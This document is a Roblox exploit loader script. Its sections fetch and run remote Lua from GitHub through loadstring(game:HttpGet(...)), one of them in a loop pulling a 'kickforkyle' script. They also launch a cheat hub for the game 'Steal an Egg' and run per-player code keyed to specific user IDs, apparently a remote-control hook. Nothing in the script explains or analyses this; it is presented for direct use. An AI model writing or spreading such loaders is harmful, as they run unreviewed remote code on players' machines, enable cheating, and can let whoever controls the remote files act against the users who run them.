-----------------------------------------------------------------------------------------------------




_G.KyleScriptRunning = false

local function UniversalWrapper()
    while _G.KyleScriptRunning do
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/kickforkyle.lua"))()

        task.wait() 
    end
end

task.spawn(UniversalWrapper)



---------------------------------------------------------------------------------------------------------




if not game:IsLoaded() then
    game.Loaded:Wait()
end

local SupportedGames = {

-- script



[107778070777162] = function()     -- STEAL AN EGG

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryuun0x/Clover/refs/heads/main/main.lua"))()  -- CLOVER HUB



    end,












}

local currentPlaceId = game.PlaceId
local scriptToExecute = SupportedGames[currentPlaceId]

if scriptToExecute then
    scriptToExecute()
end





--------------------------------------------------------------------------------------------------------------





if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()


local Playercontrol = {

-- script


[10985692688] = function()  -- xianpog8839

-- anti lag
local Terrain = workspace:FindFirstChildOfClass('Terrain')
if Terrain then
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
end

game:GetService("Lighting").GlobalShadows = false
game:GetService("Lighting").FogEnd = 9e9

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
        v.Material = Enum.Material.SmoothPlastic
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") then
        v:Destroy()
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
        v.Enabled = false
    end
end
------------------------------

-- 






end,






[1561035140] = function()  -- spylil123

print("lil phonk")

end,










}


local currentUserId = LocalPlayer.UserId
local targetScript = Playercontrol[currentUserId]


if targetScript then
    targetScript()
end































